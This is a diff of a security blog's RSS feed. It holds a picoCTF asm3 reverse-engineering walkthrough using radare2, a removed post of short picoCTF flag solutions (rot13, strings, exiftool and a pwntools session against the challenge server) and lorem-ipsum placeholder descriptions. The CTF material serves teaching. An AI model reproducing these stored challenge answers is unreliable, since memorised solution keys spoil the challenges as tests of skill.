+        <span style="color:#50fa7b">ret</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>compile and run</p>
+<pre><code>nasm -f elf32 asm3.asm
+ld -m elf_i386 asm3.o -o asm3
+radare2 ./asm3
+</code></pre>
+<p>On radare2, analyze <code>aaaa</code> and type <code>pdf</code> to read the assembly code:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">|           <span style="color:#6272a4">; arg int32_t arg_bh @ ebp+0xb
+</span><span style="color:#6272a4"></span>|           <span style="color:#6272a4">; arg int32_t arg_ch @ ebp+0xc
+</span><span style="color:#6272a4"></span>|           <span style="color:#6272a4">; arg int32_t arg_dh @ ebp+0xd
+</span><span style="color:#6272a4"></span>|           <span style="color:#6272a4">; arg int32_t arg_12h @ ebp+0x12
+</span><span style="color:#6272a4"></span>|           0<span style="color:#50fa7b">x08049000</span>      <span style="color:#bd93f9">6873</span>a186bb     push <span style="color:#bd93f9">0xbb86a173</span>             <span style="color:#6272a4">; [01] -r-x section size 45 named .text
+</span><span style="color:#6272a4"></span>|           <span style="color:#bd93f9">0x08049005</span>      <span style="color:#bd93f9">68</span>dde301d1     push <span style="color:#bd93f9">0xd101e3dd</span>
+|           0<span style="color:#50fa7b">x0804900a</span>      <span style="color:#bd93f9">68025</span>a6cba     push <span style="color:#bd93f9">0xba6c5a02</span>
+|           0<span style="color:#50fa7b">x0804900f</span>      e800000000     call loc.asm3
+|           <span style="color:#6272a4">; CALL XREF from entry0 @ 0x804900f
+</span><span style="color:#6272a4"></span>|           <span style="color:#6272a4">;-- asm3:
+</span><span style="color:#6272a4"></span>|           0<span style="color:#50fa7b">x08049014</span>      <span style="color:#bd93f9">55</span>             push ebp
+|           0<span style="color:#50fa7b">x08049015</span>      <span style="color:#bd93f9">89</span>e5           mov ebp, esp
+|           0<span style="color:#50fa7b">x08049017</span>      <span style="color:#bd93f9">31</span>c0           xor eax, eax
+|           0<span style="color:#50fa7b">x08049019</span>      <span style="color:#bd93f9">8</span>a650b         mov ah, byte [arg_bh]
+|           0<span style="color:#50fa7b">x0804901c</span>      <span style="color:#bd93f9">66</span>c1e010       shl ax, <span style="color:#bd93f9">0x10</span>
+|           0<span style="color:#50fa7b">x08049020</span>      <span style="color:#bd93f9">2</span>a450d         sub al, byte [arg_dh]
+|           0<span style="color:#50fa7b">x08049023</span>      <span style="color:#bd93f9">02650</span>c         add ah, byte [arg_ch]
+|           0<span style="color:#50fa7b">x08049026</span>      <span style="color:#bd93f9">66334512</span>       xor ax, word [arg_12h]
+|           0<span style="color:#50fa7b">x0804902a</span>      <span style="color:#bd93f9">90</span>             nop
+|           0<span style="color:#50fa7b">x0804902b</span>      <span style="color:#bd93f9">5</span>d             pop ebp
+\           0<span style="color:#50fa7b">x0804902c</span>      c3             ret
+</code></pre></td></tr></table>
+</div>
+</div><p>Set a breakpoint at the nop, then launch the program in debug mode, to retrieve the result in EAX register:</p>
+<pre><code>db 0x0804902a       ; breakpoint
+ood                 ; launch programme in debug mode
+dc                  ; continue until next breakpoint
+dr eax              ; check eax register, this is your solution
+</code></pre>
+<p>Some more useful commands to troubleshoot:</p>
+<pre><code>ds                  ; next step (when in debugger mode)
+p8 4 @ ebp+0x8      ; verify arg1
+p8 4 @ ebp+0xc      ; verify arg2
+p8 4 @ ebp+0x10     ; verify arg3
+px 20 @ ebp         ; dump 20 bytes above ebp
+</code></pre>
+]]></content>
         </item>
         
         <item>
@@ -7688,14 +8124,14 @@ Nmap done: 256 IP addresses (0 hosts up) scanned in 0.13 seconds
             <pubDate>Wed, 13 Oct 2021 22:11:33 +0800</pubDate>
             
             <guid>https://0xade1.github.io/devdraft/posts/2021/10/responder-to-capture-domain-hashes/</guid>
-            <description>Suspendisse in ligula convallis, maximus metus et, cursus velit. Aenean nec massa volutpat, lacinia lacus sit amet, tempus tellus. Etiam aliquet, est at volutpat faucibus, libero lectus ultrices leo, et tempus mi est eu quam. Nulla facilisi. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Curabitur mollis purus vel felis facilisis, eu placerat dui posuere. Ut orci arcu, hendrerit vitae eros et, maximus pellentesque leo. Sed ultrices, metus quis commodo mattis, dui eros rhoncus erat, ac pharetra purus ipsum eu tortor.</description>
+            <description>Nam quis suscipit lacus. Nullam hendrerit massa ligula, vel finibus nisl rhoncus in. Maecenas urna libero, pulvinar et pellentesque non, auctor id libero. Integer et velit vehicula, sollicitudin sapien et, finibus est. Duis sodales velit vel nisl pharetra, ut feugiat arcu mollis. Phasellus id iaculis nunc. Suspendisse dignissim augue sit amet finibus ornare. Donec mattis mollis odio et pharetra. Vestibulum ut gravida urna. Curabitur fringilla urna est, nec rutrum sem vulputate congue.</description>
             <content type="html"><![CDATA[
 
 
 
 
 
-  <p><em>Suspendisse in ligula convallis, maximus metus et, cursus velit. Aenean nec massa volutpat, lacinia lacus sit amet, tempus tellus. Etiam aliquet, est at volutpat faucibus, libero lectus ultrices leo, et tempus mi est eu quam. Nulla facilisi. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Curabitur mollis purus vel felis facilisis, eu placerat dui posuere. Ut orci arcu, hendrerit vitae eros et, maximus pellentesque leo. Sed ultrices, metus quis commodo mattis, dui eros rhoncus erat, ac pharetra purus ipsum eu tortor. Sed id tortor et neque viverra faucibus. Phasellus sem felis, tincidunt gravida vestibulum eu, lobortis eget nulla. Cras pharetra neque vitae ullamcorper eleifend. Etiam sagittis rhoncus dapibus. Donec ultrices odio at lectus egestas mollis. Cras lacus est, ultrices eget gravida eu, porttitor vel risus. Fusce eu erat in risus congue elementum quis non ante. Ut in interdum felis.</em></p>
+  <p><em>Nam quis suscipit lacus. Nullam hendrerit massa ligula, vel finibus nisl rhoncus in. Maecenas urna libero, pulvinar et pellentesque non, auctor id libero. Integer et velit vehicula, sollicitudin sapien et, finibus est. Duis sodales velit vel nisl pharetra, ut feugiat arcu mollis. Phasellus id iaculis nunc. Suspendisse dignissim augue sit amet finibus ornare. Donec mattis mollis odio et pharetra. Vestibulum ut gravida urna. Curabitur fringilla urna est, nec rutrum sem vulputate congue. Maecenas ut molestie eros. Quisque eleifend pharetra dui, sed lacinia mauris iaculis a. Donec vel venenatis nulla, non dignissim dui. Curabitur in nisi nec felis dictum ultrices sit amet quis augue.</em></p>
 
 
 
@@ -9268,14 +9704,14 @@ you navigation towards content that fits your interests.</p>
             <pubDate>Sun, 26 Sep 2021 20:32:30 +0800</pubDate>
             
             <guid>https://0xade1.github.io/devdraft/posts/2021/09/test3/</guid>
-            <description>Nam quam ante, faucibus id dolor eget, scelerisque congue justo. Sed sit amet cursus metus, sed convallis mauris. Vestibulum lobortis volutpat libero maximus faucibus. Vivamus eleifend placerat ipsum, nec tempor tellus placerat sit amet. Proin ac velit at nulla ultrices tempor non ac sem. Morbi volutpat justo non augue imperdiet lacinia. Sed dui ipsum, viverra quis tincidunt vitae, sodales nec est. Maecenas ac nibh consequat, venenatis purus ullamcorper, porttitor mauris.</description>
+            <description>Nam quis suscipit lacus. Nullam hendrerit massa ligula, vel finibus nisl rhoncus in. Maecenas urna libero, pulvinar et pellentesque non, auctor id libero. Integer et velit vehicula, sollicitudin sapien et, finibus est. Duis sodales velit vel nisl pharetra, ut feugiat arcu mollis. Phasellus id iaculis nunc. Suspendisse dignissim augue sit amet finibus ornare. Donec mattis mollis odio et pharetra. Vestibulum ut gravida urna. Curabitur fringilla urna est, nec rutrum sem vulputate congue.</description>
             <content type="html"><![CDATA[
 
 
 
 
 
-  <p><em>Nam quam ante, faucibus id dolor eget, scelerisque congue justo. Sed sit amet cursus metus, sed convallis mauris. Vestibulum lobortis volutpat libero maximus faucibus. Vivamus eleifend placerat ipsum, nec tempor tellus placerat sit amet. Proin ac velit at nulla ultrices tempor non ac sem. Morbi volutpat justo non augue imperdiet lacinia. Sed dui ipsum, viverra quis tincidunt vitae, sodales nec est. Maecenas ac nibh consequat, venenatis purus ullamcorper, porttitor mauris. Nulla elementum sem eget tortor fermentum malesuada. Integer pretium felis sem, in tincidunt nibh elementum sit amet. Donec nec orci iaculis, interdum est non, sodales est. Suspendisse pulvinar, ante sed elementum feugiat, mauris turpis blandit eros, egestas pretium risus nisl mattis urna. Integer sed urna turpis. Quisque auctor ac elit id imperdiet. Vivamus sed tortor semper, tempus ipsum sed, auctor nibh. Fusce sit amet facilisis tellus.</em></p>
+  <p><em>Nam quis suscipit lacus. Nullam hendrerit massa ligula, vel finibus nisl rhoncus in. Maecenas urna libero, pulvinar et pellentesque non, auctor id libero. Integer et velit vehicula, sollicitudin sapien et, finibus est. Duis sodales velit vel nisl pharetra, ut feugiat arcu mollis. Phasellus id iaculis nunc. Suspendisse dignissim augue sit amet finibus ornare. Donec mattis mollis odio et pharetra. Vestibulum ut gravida urna. Curabitur fringilla urna est, nec rutrum sem vulputate congue. Maecenas ut molestie eros. Quisque eleifend pharetra dui, sed lacinia mauris iaculis a. Donec vel venenatis nulla, non dignissim dui. Curabitur in nisi nec felis dictum ultrices sit amet quis augue.</em></p>
 
 
 
@@ -15493,198 +15929,24 @@ C:\Users\jared\Desktop&gt;type Access.txt
         </item>
         
         <item>
-            <title>picoCTF 2021 - Cryptography</title>
-            <link>https://0xade1.github.io/devdraft/posts/2021/08/picoctf-2021-cryptography/</link>
+            <title>picoCTF 2021 - Binary Exploitation</title>
+            <link>https://0xade1.github.io/devdraft/posts/2021/08/picoctf-2021-binary-exploitation/</link>
             <pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate>
             
-            <guid>https://0xade1.github.io/devdraft/posts/2021/08/picoctf-2021-cryptography/</guid>
-            <description>Obediant Cat 1  curl -L https://mercury.picoctf.net/static/0e428b2db9788d31189329bed089ce98/flag   Mod 26 1  echo &amp;#34;cvpbPGS{arkg_gvzr_V&amp;#39;yy_gel_2_ebhaqf_bs_ebg13_hyLicInt}&amp;#34; | tr &amp;#39;[n-za-m]&amp;#39; &amp;#39;[a-z]&amp;#39; | tr &amp;#39;[N-ZA-M]&amp;#39; &amp;#39;[A-Z]&amp;#39;   Python Wrangling 1  cat pw.txt | python3 ende.py -d flag.txt.en   Wave a flag 1  strings warm| grep -i pico   information 1  exiftool cat.jpg | grep License | awk &amp;#39;{print $3}&amp;#39; | base64 -d   Nice netcat 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  &amp;gt;&amp;gt;&amp;gt; import pwn &amp;gt;&amp;gt;&amp;gt; host, port = &amp;#39;mercury.</description>
-            <content type="html"><![CDATA[<h2 id="obediant-cat">Obediant Cat</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -L https://mercury.picoctf.net/static/0e428b2db9788d31189329bed089ce98/flag
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="mod-26">Mod 26</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;cvpbPGS{arkg_gvzr_V&#39;yy_gel_2_ebhaqf_bs_ebg13_hyLicInt}&#34;</span> | tr <span style="color:#f1fa8c">&#39;[n-za-m]&#39;</span> <span style="color:#f1fa8c">&#39;[a-z]&#39;</span> | tr <span style="color:#f1fa8c">&#39;[N-ZA-M]&#39;</span> <span style="color:#f1fa8c">&#39;[A-Z]&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="python-wrangling">Python Wrangling</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat pw.txt | python3 ende.py -d flag.txt.en
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="wave-a-flag">Wave a flag</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strings warm| grep -i pico
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="information">information</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">exiftool cat.jpg | grep License | awk <span style="color:#f1fa8c">&#39;{print $3}&#39;</span> | base64 -d
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="nice-netcat">Nice netcat</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">import</span> pwn
-<span style="color:#ff79c6">&gt;&gt;&gt;</span> host, port <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;mercury.picoctf.net&#39;</span>, <span style="color:#bd93f9">21135</span>
-<span style="color:#ff79c6">&gt;&gt;&gt;</span> s <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>remote(host, port)
-<span style="color:#ff79c6">&gt;&gt;&gt;</span> prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recv()
-<span style="color:#ff79c6">&gt;&gt;&gt;</span> prompt
-<span style="color:#f1fa8c">&#39;112 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">105 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">99 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">111 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">67 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">84 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">70 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">123 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">103 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">48 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">48 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">100 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">95 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">107 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">49 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">116 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">116 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">121 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">33 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">95 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">110 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">49 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">99 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">51 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">95 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">107 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">49 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">116 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">116 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">121 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">33 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">95 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">97 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">102 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">100 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">53 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">102 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">100 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">97 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">52 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">125 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">10 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>
-<span style="color:#ff79c6">&gt;&gt;&gt;</span> prompt<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
-[<span style="color:#f1fa8c">&#39;112&#39;</span>, <span style="color:#f1fa8c">&#39;105&#39;</span>, <span style="color:#f1fa8c">&#39;99&#39;</span>, <span style="color:#f1fa8c">&#39;111&#39;</span>, <span style="color:#f1fa8c">&#39;67&#39;</span>, <span style="color:#f1fa8c">&#39;84&#39;</span>, <span style="color:#f1fa8c">&#39;70&#39;</span>, <span style="color:#f1fa8c">&#39;123&#39;</span>, <span style="color:#f1fa8c">&#39;103&#39;</span>, <span style="color:#f1fa8c">&#39;48&#39;</span>, <span style="color:#f1fa8c">&#39;48&#39;</span>, <span style="color:#f1fa8c">&#39;100&#39;</span>, <span style="color:#f1fa8c">&#39;95&#39;</span>, <span style="color:#f1fa8c">&#39;107&#39;</span>, <span style="color:#f1fa8c">&#39;49&#39;</span>, <span style="color:#f1fa8c">&#39;116&#39;</span>, <span style="color:#f1fa8c">&#39;116&#39;</span>, <span style="color:#f1fa8c">&#39;121&#39;</span>, <span style="color:#f1fa8c">&#39;33&#39;</span>, <span style="color:#f1fa8c">&#39;95&#39;</span>, <span style="color:#f1fa8c">&#39;110&#39;</span>, <span style="color:#f1fa8c">&#39;49&#39;</span>, <span style="color:#f1fa8c">&#39;99&#39;</span>, <span style="color:#f1fa8c">&#39;51&#39;</span>, <span style="color:#f1fa8c">&#39;95&#39;</span>, <span style="color:#f1fa8c">&#39;107&#39;</span>, <span style="color:#f1fa8c">&#39;49&#39;</span>, <span style="color:#f1fa8c">&#39;116&#39;</span>, <span style="color:#f1fa8c">&#39;116&#39;</span>, <span style="color:#f1fa8c">&#39;121&#39;</span>, <span style="color:#f1fa8c">&#39;33&#39;</span>, <span style="color:#f1fa8c">&#39;95&#39;</span>, <span style="color:#f1fa8c">&#39;97&#39;</span>, <span style="color:#f1fa8c">&#39;102&#39;</span>, <span style="color:#f1fa8c">&#39;100&#39;</span>, <span style="color:#f1fa8c">&#39;53&#39;</span>, <span style="color:#f1fa8c">&#39;102&#39;</span>, <span style="color:#f1fa8c">&#39;100&#39;</span>, <span style="color:#f1fa8c">&#39;97&#39;</span>, <span style="color:#f1fa8c">&#39;52&#39;</span>, <span style="color:#f1fa8c">&#39;125&#39;</span>, <span style="color:#f1fa8c">&#39;10&#39;</span>, <span style="color:#f1fa8c">&#39;&#39;</span>]
-<span style="color:#ff79c6">&gt;&gt;&gt;</span> integers <span style="color:#ff79c6">=</span> prompt<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
-<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#bd93f9">112</span>)
-<span style="color:#f1fa8c">&#39;p&#39;</span>
-<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">from</span> decimal <span style="color:#ff79c6">import</span> Decimal
-<span style="color:#ff79c6">&gt;&gt;&gt;</span> result <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">float</span>(x<span style="color:#ff79c6">.</span>strip(<span style="color:#f1fa8c">&#39; &#34;&#39;</span>)) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> integers[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]]
-<span style="color:#ff79c6">&gt;&gt;&gt;</span> result
-[<span style="color:#bd93f9">112.0</span>, <span style="color:#bd93f9">105.0</span>, <span style="color:#bd93f9">99.0</span>, <span style="color:#bd93f9">111.0</span>, <span style="color:#bd93f9">67.0</span>, <span style="color:#bd93f9">84.0</span>, <span style="color:#bd93f9">70.0</span>, <span style="color:#bd93f9">123.0</span>, <span style="color:#bd93f9">103.0</span>, <span style="color:#bd93f9">48.0</span>, <span style="color:#bd93f9">48.0</span>, <span style="color:#bd93f9">100.0</span>, <span style="color:#bd93f9">95.0</span>, <span style="color:#bd93f9">107.0</span>, <span style="color:#bd93f9">49.0</span>, <span style="color:#bd93f9">116.0</span>, <span style="color:#bd93f9">116.0</span>, <span style="color:#bd93f9">121.0</span>, <span style="color:#bd93f9">33.0</span>, <span style="color:#bd93f9">95.0</span>, <span style="color:#bd93f9">110.0</span>, <span style="color:#bd93f9">49.0</span>, <span style="color:#bd93f9">99.0</span>, <span style="color:#bd93f9">51.0</span>, <span style="color:#bd93f9">95.0</span>, <span style="color:#bd93f9">107.0</span>, <span style="color:#bd93f9">49.0</span>, <span style="color:#bd93f9">116.0</span>, <span style="color:#bd93f9">116.0</span>, <span style="color:#bd93f9">121.0</span>, <span style="color:#bd93f9">33.0</span>, <span style="color:#bd93f9">95.0</span>, <span style="color:#bd93f9">97.0</span>, <span style="color:#bd93f9">102.0</span>, <span style="color:#bd93f9">100.0</span>, <span style="color:#bd93f9">53.0</span>, <span style="color:#bd93f9">102.0</span>, <span style="color:#bd93f9">100.0</span>, <span style="color:#bd93f9">97.0</span>, <span style="color:#bd93f9">52.0</span>, <span style="color:#bd93f9">125.0</span>, <span style="color:#bd93f9">10.0</span>]
